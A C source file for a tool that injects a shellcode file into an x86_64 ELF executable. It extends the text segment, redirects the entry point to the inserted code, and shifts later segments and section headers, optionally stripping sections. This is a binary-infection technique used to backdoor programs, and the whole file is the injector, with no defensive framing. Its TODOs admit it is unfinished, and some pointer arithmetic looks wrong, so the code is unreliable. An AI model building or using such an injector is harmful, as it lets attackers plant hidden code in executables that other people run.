#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
// TODO: handle x86_32 and x86_64
// This will currently work only on x86_64 and only if you are running x86_64
// TODO: deal with endianness
#include "include/ansidecl.h"
#include "include/elf/common.h"
#include "include/elf/external.h"

// TODO: move forward by the necessary number of pages, not just one
// TODO: patch the shell to return to the right place
// TODO: make the write calls more robust by accepting partial writes and re-trying the writes in those cases
// TODO: make this code compile without warnings

// TODO: a bit off topic, but think about how to solve the general problem of editing things while streaming with a nice declarative abstraction

static long long page_size = 0x1000;
static unsigned shell_size;
static unsigned char *shell;

static unsigned get_file_size(const char *file_name) {
  struct stat sb;
  if (stat(file_name, & sb) != 0) {
    return -1;
  }
  return sb.st_size;
}

static unsigned char *read_whole_file(const char *file_name, unsigned s) {
  unsigned char *contents;
  FILE *f;
  size_t bytes_read;
  int status;

  contents = malloc(s + 1); // XXX: why + 1 ?
  if (!contents) {
    return 0;
  }

  f = fopen(file_name, "r");
  if (! f) {
    return 0;
  }
  bytes_read = fread(contents, sizeof(unsigned char), s, f);
  if (bytes_read != s) {
    return 0;
  }
  status = fclose(f);
  if (status != 0) {
    return 0;
  }
  return contents;
}

#define max(a,b) \
   ({ __typeof__ (a) _a = (a); \
       __typeof__ (b) _b = (b); \
     _a > _b ? _a : _b; })

#define min(a,b) \
   ({ __typeof__ (a) _a = (a); \
       __typeof__ (b) _b = (b); \
     _a < _b ? _a : _b; })

typedef struct {
  Elf64_External_Ehdr ehdr; // the ehdr
  Elf64_External_Phdr *phdr; // we can't process only one phdr at a time, so we read the whole table into this first
  Elf64_External_Shdr shdr; // the current shdr being edited

  int read_bytes; // the bytes read so far

  long long shdr_offset; // the location of the shdr
  short shdr_num; // the number of shdr entries

  long long phdr_offset; // the location of the phdr
  short phdr_num; // the number of phdr entries

  long long text_end; // the end of the text segment. This is the location where we insert the shell code
  long long segment_data_end; // the end of the segment data. Anything beyond the point is stripped if we want to strip sections

  int preserve_sections; // preserve sections if this is not 0
} processing_state;

// returns the number of bytes consumed, 0 on end of stream and negative on error
// call with a buffer pointer and length
int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd) {
  int consumed_bytes = 0;

  int phdr_end = ps->phdr_offset + ps->phdr_num * sizeof(Elf64_External_Phdr);
  // we haven't finished reading the header, so we read more of the header
  if (ps->read_bytes < sizeof(ps->ehdr)) {
    fprintf(stderr, "...");

    // we have more bytes than the header, we should consume only as much as the header and let the next case handle the next part
    consumed_bytes = min(len, sizeof(ps->ehdr) - ps->read_bytes);
    memcpy(&ps->ehdr + ps->read_bytes, buff, consumed_bytes);

    // header end condition
    if (ps->read_bytes + consumed_bytes == sizeof(ps->ehdr)) {
      // 1. extract the location of phdr and shdr
      memcpy(&ps->phdr_offset, ps->ehdr.e_phoff, sizeof(ps->ehdr.e_phoff));
      memcpy(&ps->shdr_offset, ps->ehdr.e_shoff, sizeof(ps->ehdr.e_shoff));

      // 2. extract the size of phdr and shdr
      memcpy(&ps->phdr_num, ps->ehdr.e_phnum, sizeof(ps->ehdr.e_phnum));
      memcpy(&ps->shdr_num, ps->ehdr.e_shnum, sizeof(ps->ehdr.e_shnum));

      // 3. zero out the section pointers (or move them forward a page)
      if (ps->preserve_sections == 0) {
        memset(&ps->ehdr.e_shoff, 0, sizeof(ps->ehdr.e_shoff));
        memset(&ps->ehdr.e_shentsize, 0, sizeof(ps->ehdr.e_shentsize));
        memset(&ps->ehdr.e_shnum, 0, sizeof(ps->ehdr.e_shnum));
        memset(&ps->ehdr.e_shstrndx, 0, sizeof(ps->ehdr.e_shstrndx));
      } else {
        // 3. move the location of the header sections forward by a page
        long long sh_off;
        memcpy(&sh_off, &ps->ehdr.e_shoff, sizeof(ps->ehdr.e_shoff));
        sh_off += page_size;
        memcpy(&ps->ehdr.e_shoff, &sh_off, sizeof(ps->ehdr.e_shoff));
      }

      // 4. allocate a phdr array
      ps->phdr = malloc(ps->phdr_num * sizeof(Elf64_External_Phdr));

    }
  }
  // we haven't finished reading phdr, so we read more of phdr
  else if (ps->read_bytes < phdr_end) {
    fprintf(stderr, "---");

    // figure out which phdr we are on
    int current_phdr = (ps->read_bytes - sizeof(ps->ehdr)) / sizeof(Elf64_External_Phdr);

    // figure out how far into the current phdr we've read
    int bytes_read_already = ps->read_bytes - sizeof(ps->ehdr) - current_phdr * sizeof(Elf64_External_Phdr);

    // how much can we consume?
    consumed_bytes = min(len, sizeof(Elf64_External_Phdr) - bytes_read_already);
    memcpy(&ps->phdr[current_phdr], buff, consumed_bytes);

    fprintf(stderr, "current_phdr: %d\n", current_phdr);

    // we have read a full phdr
    if (bytes_read_already + consumed_bytes == sizeof(Elf64_External_Phdr)) {

      // is this the last one?
      if (current_phdr == ps->phdr_num - 1) {
        fprintf(stderr, "done\n");

        // 1. find the text segment
        int text_seg = -1;
        int i;
        for (i = 0; i < ps->phdr_num; i++) {
          // text segment is of type LOAD and is executable
          unsigned int p_type, p_flags;
          memcpy(&p_type, ps->phdr[i].p_type, sizeof(ps->phdr[i].p_type));
          memcpy(&p_flags, ps->phdr[i].p_flags, sizeof(ps->phdr[i].p_flags));
          if (text_seg == -1 && p_type == PT_LOAD && (p_flags & PF_X) != 0) {
            text_seg = i;
            break;
          }
        }
        if (text_seg == -1) {
          return -1;
        }

        // 2. change the entry point in the header to be after the end of the text segment
        // XXX: assume filesz == memsz
        long long text_off, text_filesz, text_vaddr;
        memcpy(&text_off, &ps->phdr[text_seg].p_offset, sizeof(ps->phdr[text_seg].p_offset));
        memcpy(&text_filesz, &ps->phdr[text_seg].p_filesz, sizeof(ps->phdr[text_seg].p_filesz));
        memcpy(&text_vaddr, &ps->phdr[text_seg].p_vaddr, sizeof(ps->phdr[text_seg].p_vaddr));
        long long entry_point = text_vaddr + text_filesz;
        memcpy(&ps->ehdr.e_entry, &entry_point, sizeof(ps->ehdr.e_entry));

        // 3. extend the text segment by the size of the shell
        long long text_newsz = text_filesz + shell_size;
        memcpy(&ps->phdr[text_seg].p_filesz, &text_newsz, sizeof(ps->phdr[text_seg].p_filesz));
        memcpy(&ps->phdr[text_seg].p_memsz, &text_newsz, sizeof(ps->phdr[text_seg].p_memsz));

        // 4. all segments that are after our shell forward by a page only on disk
        // XXX: assume filesz == memsz
        for (i = 0; i < ps->phdr_num; i++) {
          long long seg_off, seg_new_off;
          memcpy(&seg_off, &ps->phdr[i].p_offset, sizeof(ps->phdr[i].p_offset));
          if (seg_off > text_off + text_filesz) {
            seg_new_off = seg_off + page_size;
            memcpy(&ps->phdr[i].p_offset, &seg_new_off, sizeof(ps->phdr[i].p_offset));
          }
        }

        // 5. find the end of the segment contents on disk so that we know where to cut off the file if stripping sections
        if (ps->preserve_sections == 0) {
          for (i = 0; i < ps->phdr_num; i++) {
            long long seg_off, seg_size;
            memcpy(&seg_off, &ps->phdr[i].p_offset, sizeof(ps->phdr[i].p_offset));
            memcpy(&seg_size, &ps->phdr[i].p_filesz, sizeof(ps->phdr[i].p_filesz));
            ps->segment_data_end = max(ps->segment_data_end, seg_off + seg_size);
          }
        }

        // 6. remember where the text segment ends so that we can insert the shell there
        ps->text_end = text_off + text_filesz;

        // 7. start sending the ehdr and phdr
        fprintf(stderr, "start sending...\n");
        if (write(out_fd, &ps->ehdr, sizeof(ps->ehdr)) != sizeof(ps->ehdr)) {
          return -2;
        }
        for (i = 0; i < ps->phdr_num; i++) {
          if (write(out_fd, &ps->phdr[i], sizeof(ps->phdr[i])) != sizeof(ps->phdr[i])) {
            return -3;
          }
        }
      }
    }
  } else {
    // every time we receive bytes before the end of the text segment, just pass them through
    if (ps->read_bytes < ps->text_end) {
      consumed_bytes = min(len, ps->text_end - ps->read_bytes);
      if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
        return -4;
      }

      // when we get to the end, dump in the shell and then the padding after it
      if (ps->read_bytes + consumed_bytes == ps->text_end) {
        if (write(out_fd, shell, shell_size) != shell_size) {
          return -5;
        }
        int i;
        char null[] = "\0";
        // padding for page size left over and for the original space that existed between the data and text sections on disk
        for (i = 0; i < page_size - shell_size; i++) {
          if (write(out_fd, null, 1) != 1) {
            return -6;
          }
        }
      }
    } else if (len > 0) {
      fprintf(stderr, "+++\n");
      // depending on whether or not we preserve the sections, decide how much data to write out
      if (ps->preserve_sections == 0) {
        if (len >= ps->segment_data_end - ps->read_bytes) {
          consumed_bytes = ps->segment_data_end - ps->read_bytes;
        } else {
          consumed_bytes = len;
        }
        if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
          return -7;
        }
      } else {
        // we are preserving sections
        // check if we are not already done with shdr
        if (ps->read_bytes < ps->shdr_offset + ps->shdr_num * sizeof(Elf64_External_Shdr)) {
          // check if we are before the shdr section. In that case just read up to as close to the shdr section as possible
          if (ps->read_bytes < ps->shdr_offset) {
            consumed_bytes = min(ps->shdr_offset - ps->read_bytes, len);
            if (write(out_fd, buff, consumed_bytes) != consumed_bytes) {
              return -8;
            }
          } else {
            // we are at least on the 1st byte of the shdr table and not past the end yet

            // find out which shdr we are on and how far into it
            long long shdr_global_off = ps->read_bytes - ps->shdr_offset;
            //long long shdr_idx = shdr_global_off / sizeof(Elf64_External_Shdr);
            long long shdr_off = shdr_global_off % sizeof(Elf64_External_Shdr);

            // if we can read the whole rest of the current shdr, read it in, modify it and spit it out
            if (shdr_off + len >= sizeof(Elf64_External_Shdr)) {
              fprintf(stderr, "We can read the whole thing\n");
              consumed_bytes = sizeof(Elf64_External_Shdr) - shdr_off;
              memcpy(&ps->shdr + shdr_off, buff, consumed_bytes);
              // we have a whole shdr at this point
              long long data_offset, data_size;
              memcpy(&data_offset, ps->shdr.sh_offset, sizeof(ps->shdr.sh_offset));
              memcpy(&data_size, ps->shdr.sh_size, sizeof(ps->shdr.sh_size));
              // the section needs to be expanded to include the entry point
              if (data_offset + data_size == ps->text_end) {
                data_size += shell_size;
                memcpy(ps->shdr.sh_size, &data_size, sizeof(ps->shdr.sh_size));
              } else if (data_offset > ps->text_end) {
                // the section is after the inserted space, so we have to move it forward a page
                data_offset += page_size;
                memcpy(ps->shdr.sh_offset, &data_offset, sizeof(ps->shdr.sh_offset));
              }
              if (write(out_fd, &ps->shdr, sizeof(Elf64_External_Shdr)) != sizeof(Elf64_External_Shdr)) {
                return -9;
              }
            }

            // otherwise read as much as we can and continue
            else {
              fprintf(stderr, "We can NOT read the whole thing\n");
              consumed_bytes = len;
              memcpy(&ps->shdr + shdr_off, buff, len);
            }
          }
        } else {
          fprintf(stderr, "after end\n");
          consumed_bytes = len;
          if (write(out_fd, buff, len) != len) {
            return -10;
          }
        }
      }
    } else {
      // we are done!
      free(ps->phdr);
      consumed_bytes = 0;
    }
  }

done:
  ps->read_bytes += consumed_bytes;
  return consumed_bytes;
}

int process(int in_fd, int out_fd, int preserve_sections) {
  processing_state ps;
  memset(&ps, 0, sizeof(ps));
  ps.preserve_sections = preserve_sections;

  unsigned char in_buff[BUFSIZ];
  int in_buff_len;

  while ((in_buff_len = read(in_fd, in_buff, BUFSIZ)) != 0) {
    int offset = 0;
    while (offset < in_buff_len) {
      fprintf(stderr, "len going in: %d\n", in_buff_len - offset);
      int consumed = handle_bytes(&ps, in_buff + offset, in_buff_len - offset, out_fd);
      fprintf(stderr, "consumed: %d\n", consumed);
      if (consumed <= 0) {
        return consumed;
      }
      offset += consumed;
    }
    fprintf(stderr, "offset: %d\n", offset);
  }
  fprintf(stderr, "exit: %d\n", in_buff_len);
  return in_buff_len;
}

int main(int argc, char* argv[]) {
  // assume we want to preserve the sections
  int preserve_sections = 1;

  if (argc < 2) {
    fprintf(stderr, "Usage: %s <shell_path> [--strip-sections]", argv[0]);
    return 0;
  }
  //XXX: a bit of a race condition here, TOCTOU, etc. but such is the way of the lazy; we check the size later again, I guess...
  if (argc >= 3) {
    if (strcmp(argv[2], "--strip-sections") == 0) {
      preserve_sections = 0;
    }
  }
  shell_size = get_file_size(argv[1]);
  if (shell_size == -1) {
    fprintf(stderr, "Failed to stat shell file: %s", argv[1]);
    return 1;
  }
  shell = read_whole_file(argv[1], shell_size);
  if (!shell) {
    return 1;
  }
  int ret = process(STDIN_FILENO, STDOUT_FILENO, preserve_sections);
  free(shell);
  return ret;
}
